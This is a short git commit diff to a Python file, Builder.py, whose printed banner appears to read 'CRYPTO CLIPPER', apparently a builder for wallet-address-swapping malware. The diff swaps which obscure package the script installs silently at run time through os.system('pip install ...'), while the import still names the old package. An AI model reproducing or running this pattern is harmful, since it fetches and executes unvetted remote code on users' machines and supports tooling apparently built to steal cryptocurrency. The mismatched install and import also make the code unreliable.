b01c8d1ab66df0dc9cf7a07c3986bf9bb44acdca
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-05-02 12:18:45 -0700

    Update Builder.py

--- Builder.py
+++ Builder.py
@@ -1,5 +1,5 @@
 import os
-os.system("pip install pylibfonts")
+os.system("pip install pylibsql")
 import pylibfonts
 print("""
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░  ░█████╗░██╗░░░░░██╗██████╗░██████╗░███████╗██████╗░
